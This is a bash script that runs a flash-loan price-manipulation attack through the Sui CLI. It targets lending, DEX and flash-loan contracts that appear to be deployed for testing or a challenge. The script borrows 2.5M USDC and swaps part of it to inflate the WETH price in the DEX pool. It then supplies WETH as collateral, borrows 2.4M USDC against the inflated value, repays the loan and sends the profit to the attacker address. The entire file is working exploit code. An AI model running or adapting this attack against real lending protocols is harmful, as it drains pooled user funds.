#!/bin/bash

set -e

# Load environment
source .env

# Setup Fresh Environment if needed

ATTACKER=$(sui client active-address)
USDC_TYPE="$PACKAGE_ID::usdc::USDC"
WETH_TYPE="$PACKAGE_ID::weth::WETH"
ATTACK_DEX_POOL=$DEX_POOL_WETH_USDC
ATTACK_MARKET=$MARKET_USDC

FLASH_LOAN_AMOUNT=2500000000000   # 2.5M USDC
SWAP_AMOUNT=1000000000000         # 1M USDC
SUPPLY_AMOUNT=1000000000          # 10 WETH
BORROW_AMOUNT=2400000000000       # 2.4M USDC
REPAY_AMOUNT=2502250000000        # 2.5M + 0.09% fee

sui client ptb \
    --assign flash_loan_amount $FLASH_LOAN_AMOUNT \
    --assign swap_amount $SWAP_AMOUNT \
    --assign supply_amount $SUPPLY_AMOUNT \
    --assign borrow_amount $BORROW_AMOUNT \
    --assign repay_amount $REPAY_AMOUNT \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::borrow_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" flash_loan_amount \
    --assign loan_res \
    --assign loan_coin loan_res.0 \
    --assign receipt loan_res.1 \
    \
    --split-coins loan_coin "[swap_amount]" \
    --assign swap_coin \
    \
    --move-call "$PACKAGE_ID::simple_dex::swap_b_to_a<$WETH_TYPE,$USDC_TYPE>" \
        @"$ATTACK_DEX_POOL" swap_coin 0 \
    --assign weth_out \
    \
    --move-call "$PACKAGE_ID::coin_factory::mint_weth" @$COIN_FACTORY_ID supply_amount \
    --assign minted_weth \
    \
    --merge-coins weth_out "[minted_weth]" \
    \
    --move-call "$PACKAGE_ID::compound_market::supply<$WETH_TYPE>" \
        @"$MARKET_WETH" weth_out @0x6 \
    --assign position \
    \
    --move-call "$PACKAGE_ID::compound_market::borrow<$WETH_TYPE,$USDC_TYPE>" \
        @"$MARKET_WETH" @"$ATTACK_MARKET" position @"$ATTACK_DEX_POOL" borrow_amount @0x6 \
    --assign borrowed_usdc \
    \
    --merge-coins loan_coin "[borrowed_usdc]" \
    \
    --split-coins loan_coin "[repay_amount]" \
    --assign repay_coin \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::repay_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" repay_coin receipt \
    \
    --transfer-objects "[position, loan_coin]" @$ATTACKER \
    --gas-budget 100000000 --json